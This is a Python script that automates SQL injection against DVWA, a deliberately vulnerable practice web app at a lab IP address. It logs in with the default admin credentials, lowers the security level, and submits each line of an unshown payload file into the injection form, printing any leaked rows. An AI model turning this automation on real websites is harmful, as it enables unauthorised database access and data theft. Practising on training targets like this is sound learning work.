# -*- coding: utf-8 -*-

import logging
import os
import sys
from bs4 import BeautifulSoup
import time
import mechanize
from colorama import Fore, Style



if not os.path.exists('logs'):
    os.makedirs('logs')
logging.basicConfig(filename='logs/sqlinjection.log', level=logging.DEBUG,
                    format='%(asctime)s %(levelname)s %(name)s %(message)s')
logger = logging.getLogger(__name__)

RHOST = "192.168.0.50"


class SQLinjector:
    def __init__(self):
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        # self.br.set_debug_http(True)
        # br.set_debug_redirects(True)
        # br.set_debug_responses(True)

    def login(self):
        try:
            self.br.open("http://" + RHOST)
            #self.br.open("http://" + RHOST + "/dvwa")
            self.br.select_form(nr=0)

            self.br.form['username'] = 'admin'
            self.br.form['password'] = 'password'
            self.br.submit()

            self.br.follow_link(url_regex=r'security.php')
            self.br.select_form(nr=0)  # selects the form
            self.br.form['security'] = ["low"]  # changes the security setting to low
            res = self.br.submit()
            content = res.read()
            self.soup = BeautifulSoup(content, 'html.parser')

            get_seclevel = self.soup.find("em")
            seclevel = str(get_seclevel).split("<em>")[1].replace("</em>", "")
            def sEClevel():
                if seclevel == 'high':
                    print("- Security Level:",Fore.LIGHTRED_EX, Style.BRIGHT, seclevel , Style.RESET_ALL)
                elif seclevel == 'medium':
                    print("- Security Level:",Fore.YELLOW, Style.BRIGHT, seclevel, Style.RESET_ALL)
                elif seclevel == 'low':
                    print("- Security Level:",Fore.LIGHTGREEN_EX, Style.BRIGHT, seclevel, Style.RESET_ALL)
                else:
                    print("FUCK OFF")


            print("-" * 55)
            print("- " + self.br.title())
            sEClevel()
            print("-" * 55 )

        except Exception as e:
            logger.error(e)
            print(e)


    def sqlinject(self):
        try:
            self.passwords = open("input_files/sqlinjection.txt", 'r')
            #self.passwords = open("input_files/sqlinjection.txt", 'r')
            for self.password in self.passwords:
                self.password = self.password.replace("\n", "")

                self.br.follow_link(url_regex=r'sqli')

               #print("-" * 55)
                #print("- " + self.br.title())
               # print("-" * 55)

                self.br.select_form(nr=0)

                self.br.form['id'] = self.password


                res = self.br.submit()
                content = res.read()
                soup = BeautifulSoup(content, "lxml")
                err = soup.html.body.pre

                if err == "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1":
                    pass
                    print("WRONG PARAMETER", self.password)
                    pass
                elif err == None:
                    print("WRONG PARAMETER", self.password)
                    pass
                else:
                    allPre = soup.find_all("pre")
                    for pre in allPre:
                        print(str(pre).split("<br/>")[0].replace("<pre>", "").replace("</pre>", ""))
                        print(str(pre).split("<br/>")[1].replace("<pre>", "").replace("</pre>", ""))
                        print(str(pre).split("<br/>")[2].replace("<pre>", "").replace("</pre>", ""))
                        print("-" * 55)
                        #time.sleep(2)
        except IndexError:
            pass


        #except IndexError as error:
            #logger.error(error)
            #print(error)

        except Exception as e:
            print(e)
        else:
            print("")
        finally:
            pass

def main():
    automate = SQLinjector()
    automate.login()
    automate.sqlinject()


if __name__ == '__main__':
    main()
